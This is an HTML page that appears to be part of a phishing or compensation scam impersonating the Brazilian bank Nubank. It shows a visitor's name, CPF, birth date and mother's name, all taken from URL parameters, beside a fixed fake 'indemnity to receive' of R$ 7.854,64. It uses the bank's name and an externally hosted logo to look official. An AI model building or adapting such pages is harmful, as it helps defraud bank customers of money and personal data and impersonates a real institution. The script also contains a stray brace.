<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Confirmação de Identidade - Nubank</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      text-align: center;
      padding: 20px;
      margin: 0;
    }

    .container {
      width: 90%;
      max-width: 400px;
      margin: 0 auto;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 20px;
      box-sizing: border-box;
    }

    .logo {
      margin-bottom: 10px;
    }

    .divider {
      border-top: 3px solid #8000ff;
      margin: 20px 0;
    }

    .info-box {
      background: #f3f3f3;
      padding: 15px;
      margin-bottom: 10px;
      border-radius: 5px;
      text-align: left;
    }

    .info-box b {
      display: block;
      font-size: 0.9em;
      color: #777;
    }

    .info-box span {
      font-weight: bold;
      font-size: 1.1em;
    }

    .footer {
      font-size: 0.9em;
      color: #666;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img
      class="logo"
      src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png"
      alt="Nubank"
      width="100"
    />

    <div class="divider"></div>

    <div class="info-box">
      <center>
        Sua identidade foi confirmada com sucesso! <br />
        Confira abaixo as informações cadastradas.<br />
      </center>
    </div>

    <div class="info-box">
      <b>Nome completo</b>
      <span id="nome">...</span>
    </div>

    <div class="info-box">
      <b>CPF</b>
      <span id="cpf">...</span>
    </div>

    <div class="info-box">
      <b>Data de Nascimento</b>
      <span id="nascimento">...</span>
    </div>

    <div class="info-box">
      <b>Nome da Mãe</b>
      <span id="mae">...</span>
    </div>

    <div class="info-box">
      <b>Indenização a receber</b>
      <strong>R$ 7.854,64</strong>
    </div>

    <div class="divider"></div>

    <div class="footer">
      Sistema de Verificação - Nubank<br />
      Santa Catarina
    </div>
  </div>

<script>
  function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

     const nome = getQueryParam('nome');
     const cpf = getQueryParam('cpf');
     const datanasc = getQueryParam('datanasc');
     const mae = getQueryParam('mae');

    if (nome) document.getElementById('nome').textContent = nome;
    if (cpf) document.getElementById('cpf').textContent = cpf;
    if (datanasc) document.getElementById('nascimento').textContent = datanasc;
    if (mae) document.getElementById('mae').textContent = mae;
      
    }
  </script>

</body>
</html>
